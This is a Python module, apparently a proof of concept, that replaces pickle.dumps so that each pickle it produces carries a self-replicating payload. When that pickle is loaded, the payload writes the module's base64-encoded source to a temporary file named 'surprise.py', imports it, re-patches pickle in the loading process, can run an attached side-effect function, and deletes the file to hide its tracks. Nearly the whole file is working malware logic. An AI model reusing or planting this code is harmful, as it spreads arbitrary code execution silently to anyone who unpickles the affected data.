import base64
import contextlib
import inspect

from utils.main_functions import patch_pickle_bytes, make_source_from_function


@contextlib.contextmanager
def disarm_fake_dumps():
    import pickle
    original_dumps = pickle._odumps if hasattr(pickle, "_odumps") else pickle.dumps
    yield
    pickle.dumps = original_dumps
    if hasattr(pickle, "_odumps"):
        delattr(pickle, "_odumps")


def patch_bomb(injection, side_effect=None):
    with open(__file__, "r", encoding="utf8") as f:
        this_source = f.read()
    placeholder = "IMPOSSIBLESTRING"[::-1]
    this_source = this_source.replace("\"", placeholder).replace("\'", "\"").replace(placeholder, "\"")

    def patch():
        import base64
        patch_code = """{this_source}"""
        patch_code = base64.standard_b64decode(patch_code)
        silent_module_file = open("surprise.py", "wb")
        silent_module_file.write(patch_code)
        silent_module_file.close()
        from surprise import make_fake_dumps
        make_fake_dumps("{injection}", "{side_effect}")
        import os
        os.remove("surprise.py")

    patch_source = inspect.getsourcelines(patch)[0]
    patch_source = "".join(l[4:] for l in patch_source)
    if side_effect:
        patch_source += "\n".join("    " + l.rstrip("; ") for l in make_source_from_function(side_effect).splitlines())
    placeholders = {
        "injection": injection.__name__,
        "side_effect": side_effect.__name__ if side_effect else "",

    }
    if "{this_source}" in patch_source:
        placeholders["this_source"] = base64.standard_b64encode(this_source.encode("utf8")).decode("utf8")
    patch_source = patch_source.format(**placeholders)
    exec(patch_source)
    res = locals()["patch"]
    res._source = patch_source
    return res


def append_source(f):
    f._source = inspect.getsource(f)
    return f


def make_fake_dumps(bomb_name, side_effect_name):
    import pickle
    original_dumps = pickle._odumps if hasattr(pickle, "_odumps") else pickle.dumps
    pickle._odumps = original_dumps
    bomb = globals()[bomb_name]
    bomb = append_source(bomb)
    if bomb_name == "patch_bomb":
        side_effect = globals().get(side_effect_name)
        bomb = bomb(bomb, side_effect)

    def dumps(obj):
        return patch_pickle_bytes(original_dumps(obj), bomb)

    pickle.dumps = dumps
